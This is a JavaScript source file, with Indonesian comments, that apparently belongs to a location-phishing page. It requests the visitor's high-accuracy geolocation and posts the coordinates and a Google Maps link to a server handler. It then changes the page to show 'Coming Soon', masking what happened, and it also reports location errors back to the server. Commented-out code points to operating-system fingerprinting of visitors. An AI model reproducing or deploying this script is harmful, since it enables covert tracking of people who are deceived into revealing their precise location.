function locate()
{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);

  }
  else
  {
   // alert('Geolocation is not Supported by your Browser...');
  }

  function showPosition(position)
  {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    console.log(lat + ' ' + lon);
    $.ajax({
      type: 'POST',
      url: 'handler.php',
      data: {"posisi":`\nLatitude : ${lat}\nLongitude : ${lon} \nGoogle Map Link : https://google.com/maps/place/${lat}+${lon}`},
      success: function(){$('#change').html('Coming Soon');},
      mimeType: 'text'
    });
    
  };
}

function showError(error)
{
	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			var denied = 'User denied the request for Geolocation';
           // kei tampilan error var client = new ClientJS(); // Create A New Client Object
    //  var client = new ClientJS();
    //var OS = client.getOS();
    //console.log(OS);
    //if(OS !== 'Windows'){
    //  $('.formulir').hide();
    //  $('.tampil_error').show();
    //}
      break;
		case error.POSITION_UNAVAILABLE:
			var unavailable = 'Location information is unavailable';
			break;
		case error.TIMEOUT:
			var timeout = 'The request to get user location timed out';
      //alert('Please Set Your Location Mode on High Accuracy...');
      $.ajax({
        type: 'POST',
        url: 'handler.php',
        data: {posisi: "Posisi Tidak akurat"},
        success: function(){$('#change').html('Failed');},
        mimeType: 'text'
      });
			break;
		case error.UNKNOWN_ERROR:
			var unknown = 'An unknown error occurred';
			break;
	}

  $.ajax({
    type: 'POST',
    url: 'error.php',
    data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
    success: function(){$('#change').html('Failed');},
    mimeType: 'text'
  });

}
